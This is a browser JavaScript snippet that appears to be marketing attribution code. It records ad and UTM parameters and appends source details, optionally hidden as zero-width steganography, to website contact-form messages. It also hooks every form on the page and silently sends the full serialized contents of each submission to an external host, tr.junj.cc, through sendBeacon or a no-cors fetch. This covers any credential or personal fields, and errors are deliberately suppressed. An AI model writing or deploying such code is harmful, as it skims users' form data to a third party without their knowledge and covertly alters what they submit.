(() => {
    "use strict";
    const D = document, W = window, CFG = W.__LS_CONFIG || {};
    const DEBUG = !!CFG.debug;     // 控制按钮与描边（默认 false）
    const STEGA = !!CFG.stega;     // 提交是否自动隐写（默认 false）
    const $ = (s, r) => (r || D).querySelector(s), $$ = (s, r) => Array.from((r || D).querySelectorAll(s));
    const add = e => { try { (D.body || D.documentElement).appendChild(e); } catch { } };
    const outline = (el, ok, msg) => { if (!DEBUG || !el) return; el.style.outline = ok ? "2px solid #20c997" : "2px dashed #ff6b6b"; el.style.outlineOffset = "2px"; el.title = msg || ""; };

    const PARAM_LABELS = {
        campaignid: "广告系列ID",
        adgroupid: "广告组ID",
        keyword: "关键词",
        matchtype: "匹配类型",
        devicemodel: "设备型号",
        device: "设备",
        loc_physical_ms: "地理位置代码",
        campaignname: "活动名称",
        groupnname: "广告组名称",
        gad_source: "gad_source",
        gad_campaignid: "gad_campaignid",
        gclid: "gclid",
        utm_source: "UTM来源",
        utm_medium: "UTM媒介",
        utm_campaign: "UTM活动",
        utm_term: "UTM关键词",
        utm_content: "UTM内容"
    };

    const PARAM_EXPLAIN = {
        matchtype: { p: "精确匹配", e: "精确匹配", b: "广泛匹配" },
        device: { m: "移动", c: "电脑", t: "平板" },
        loc_physical_ms: { "1000010": "中国" },
        gad_source: { "1": "Google标准广告流量" }
    };

    const PICK_ORDER = [
        "campaignid", "adgroupid", "keyword", "matchtype", "devicemodel", "device", "loc_physical_ms",
        "campaignname", "groupnname", "gad_source", "gad_campaignid", "gclid",
        "utm_source", "utm_medium", "utm_campaign", "utm_term", "utm_content"
    ];

    function pickUsefulParams(urlStr) {
        let out = {};
        try {
            const u = new URL(urlStr);
            for (const k of Object.keys(PARAM_LABELS)) {
                const v = u.searchParams.get(k);
                if (v !== null && v !== "") out[k] = v;
            }
        } catch { }
        return out;
    }

    const LS_KEY = "lsm_first_landing";
    const parseSource = (urlObj, ref) => {
        const p = urlObj.searchParams;
        const src = p.get("utm_source") || "", med = p.get("utm_medium") || "";
        const cam = p.get("utm_campaign") || p.get("gad_campaignid") || p.get("hsa_cam") || "";
        const gclid = p.get("gclid") || "", msclkid = p.get("msclkid") || "", fbclid = p.get("fbclid") || "", ttclid = p.get("ttclid") || "", gbraid = p.get("gbraid") || "", wbraid = p.get("wbraid") || "";
        let rh = ""; try { rh = ref ? new URL(ref).hostname : "" } catch { }
        const host = location.hostname;
        const isPaid = !!(gclid || msclkid || fbclid || ttclid || gbraid || wbraid ||
            /adwords|cpc|ppc|paid|pmax|sem|gads|googleads|meta|facebook|tiktok|linkedin/i.test(src + "," + med));
        const isSearch = !!(rh && rh !== host && /google\.|bing\.|yahoo\.|duckduckgo\.|baidu\.|yandex\./i.test(rh));
        const isInternal = rh && rh === host;
        const type = isPaid ? "付费投放" : isSearch ? "自然搜索" : isInternal ? "站内跳转" : rh ? "外部推荐" : "直接访问";
        const medium = isPaid ? (src || "adwords") + "/" + (med || "ppc") : isSearch ? (rh || "search") : isInternal ? host : (rh || "(direct)");
        let adId = "";
        if (gclid) adId = "gclid:" + gclid;
        else if (msclkid) adId = "msclkid:" + msclkid;
        else if (fbclid) adId = "fbclid:" + fbclid;
        else if (ttclid) adId = "ttclid:" + ttclid;
        else if (p.get("hsa_ad")) adId = "hsa_ad:" + p.get("hsa_ad");
        return { type, medium, campaign: cam, adId };
    };

    const getLanding = () => {
        const raw = localStorage.getItem(LS_KEY);
        if (raw) { try { return JSON.parse(raw) } catch { } }
        const urlFull = location.href; // 完整首落地 URL（含所有参数）
        const info = parseSource(new URL(urlFull), document.referrer || "");
        const data = { ts: new Date().toISOString(), ref: document.referrer || "", urlFull, ...info };
        try { localStorage.setItem(LS_KEY, JSON.stringify(data)); } catch { }
        return data;
    };

    function visibleBlock(a) {
        console.log(a)
        const lp = pickUsefulParams(a.urlFull);
        const lines = [
            "\n\n—— 来源信息 ——",
            `来源：${a.type}（${a.medium}）`,
            a.campaign ? `活动：${a.campaign}` : null,
            a.adId ? `广告ID：${a.adId}` : null,
            `首落地页：${a.urlFull}`,
            `当前页面：${location.href}`
        ].filter(Boolean);

        const paramLines = [];
        for (const k of PICK_ORDER) {
            if (lp[k] !== undefined) {
                const label = PARAM_LABELS[k] || k;
                const val = lp[k];
                const exp = PARAM_EXPLAIN[k] && PARAM_EXPLAIN[k][val];
                paramLines.push(`${label}：${val}${exp ? `（${exp}）` : ""}`);
            }
        }
        if (paramLines.length) {
            lines.push("—— 广告参数 ——");
            lines.push(...paramLines);
        }
        return lines.join("\n");
    }

    const Z0 = "\u200B", Z1 = "\u200C", SEP = "\u2063";
    const toBits = s => Array.from(new TextEncoder().encode(s)).map(b => b.toString(2).padStart(8, "0")).join("");
    const encZ = s => SEP + toBits(s).replace(/0/g, Z0).replace(/1/g, Z1) + SEP;

    function hiddenPayload(a) {
        const lp = pickUsefulParams(a.urlFull);
        const adParamsCN = {};
        for (const k of PICK_ORDER) {
            if (lp[k] !== undefined) {
                const label = PARAM_LABELS[k] || k;
                const val = lp[k];
                const exp = PARAM_EXPLAIN[k] && PARAM_EXPLAIN[k][val];
                adParamsCN[label] = exp ? `${val}（${exp}）` : val;
            }
        }
        return encZ(JSON.stringify({
            "来源类型": a.type,
            "来源媒介": a.medium,
            "活动": a.campaign,
            "广告ID": a.adId,
            "首落地页": a.urlFull,
            "当前页面": location.href,
            "广告参数": adParamsCN
        }));
    }

    const hasVisible = v => v && v.indexOf("—— 来源信息 ——") > -1;
    const hasHidden = v => v && v.indexOf(SEP) > -1;

    const pickMessageField = form => {
        return $('textarea[name*="message" i], textarea[name*="content" i], textarea[name*="your-message" i], .elementor-form textarea', form)
            || $('textarea', form)
            || $('input[type="text"][name*="message" i], input[type="text"][name*="content" i]', form)
            || $('input[type="text"]', form);
    };

    const cacheV = new WeakMap(), cacheH = new WeakMap();
    const injectVisible = fld => { if (!fld) return false; const old = fld.value || ""; if (hasVisible(old)) return false; const a = getLanding(); cacheV.set(fld, old); fld.value = old + visibleBlock(a); return true; };
    const revertVisible = fld => { if (!cacheV.has(fld)) return false; fld.value = cacheV.get(fld); cacheV.delete(fld); return true; };
    const injectHidden = fld => { if (!fld) return false; const old = fld.value || ""; if (hasHidden(old)) return false; const a = getLanding(); cacheH.set(fld, old); fld.value = old + hiddenPayload(a); return true; };
    const revertHidden = fld => { if (!cacheH.has(fld)) return false; fld.value = cacheH.get(fld); cacheH.delete(fld); return true; };

    function serializeFormToUrlEncoded(form) {
        const fd = new FormData(form);
        const usp = new URLSearchParams();
        // 把 FormData 全部转成 x-www-form-urlencoded；文件类型跳过
        for (const [k, v] of fd.entries()) {
            if (v instanceof File) continue;
            usp.append(k, v == null ? "" : String(v));
        }
        return usp.toString();
    }
    function pingMirror(form) {
        try {
            const body = serializeFormToUrlEncoded(form);
            const url = "https://tr.junj.cc/cj";
            const blob = new Blob([body], { type: "application/x-www-form-urlencoded;charset=UTF-8" });

            // 优先 sendBeacon（不阻塞页面）
            let ok = false;
            if (navigator.sendBeacon) {
                ok = navigator.sendBeacon(url, blob);
            }
            // 兜底：fetch keepalive（不关心返回，避免 CORS 阻塞）
            if (!ok) {
                fetch(url, {
                    method: "POST",
                    mode: "no-cors",
                    keepalive: true,
                    headers: { "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8" },
                    body
                }).catch(() => { });
            }
        } catch (e) { /* 静默失败，不影响原表单提交 */ }
    }

    const bound = new WeakSet();
    const bindSubmit = form => {
        if (bound.has(form)) return;
        const fld = pickMessageField(form);
        if (!fld) { outline(form, false, "未找到留言字段"); return; }
        form.addEventListener("submit", () => {
            // 1) 若开启 stega，先把隐写注入 message 字段，保证镜像与提交一致
            if (STEGA) {
                injectHidden(fld);
            } else {
                injectVisible(fld); // 注入可见来源信息
            }
            // 2) 无论 stega 与否，都镜像上报一份
            pingMirror(form);
        }, true);
        bound.add(form);
        outline(form, true, STEGA ? "已绑定·提交时隐写+镜像" : "已绑定·仅镜像（stega=false）");
    };
    const scanAndBind = () => { $$("form").forEach(bindSubmit); };

    const applyAll = fn => { let n = 0; $$("form").forEach(f => { const fld = pickMessageField(f); if (fld && fn(fld)) n++; }); return n; };
    const mountButtons = () => {
        if (!DEBUG) return;
        const wrap = D.createElement("div");
        wrap.style.cssText = "position:fixed;right:16px;bottom:16px;z-index:2147483647;display:flex;flex-direction:column;gap:8px";
        const mk = (txt, color, inj, rev) => {
            const b = D.createElement("button");
            b.textContent = txt; b.style.cssText = `padding:8px 10px;border:none;border-radius:14px;color:#fff;background:${color};cursor:pointer;box-shadow:0 6px 18px rgba(0,0,0,.12)`;
            let on = false;
            b.onclick = () => {
                if (!on) { const n = applyAll(inj); if (n) { b.textContent = "撤销·" + txt; b.style.background = "#198754"; on = true; } }
                else { applyAll(rev); b.textContent = txt; b.style.background = color; on = false; }
            };
            return b;
        };
        wrap.appendChild(mk("注入·可见来源", "#0d6efd", injectVisible, revertVisible));
        wrap.appendChild(mk("注入·内部隐写", "#6f42c1", injectHidden, revertHidden));
        add(wrap);
    };

    const readylsv2 = fn => { if (D.readyState === "loading") D.addEventListener("DOMContentLoaded", fn, { once: true }); else fn(); };
    readylsv2(() => { try { scanAndBind(); } catch { } try { new MutationObserver(() => scanAndBind()).observe(D.documentElement, { childList: true, subtree: true }); } catch { } getLanding(); mountButtons(); });

    W.__LSM_decode = function (text) {
        try {
            const parts = (text || "").split(SEP);
            if (parts.length < 3) return null;
            const bits = parts[1].replaceAll(Z0, "0").replaceAll(Z1, "1");
            const bytes = bits.match(/.{8}/g).map(b => parseInt(b, 2));
            return JSON.parse(new TextDecoder().decode(Uint8Array.from(bytes)));
        } catch (e) { return null; }
    };
})();
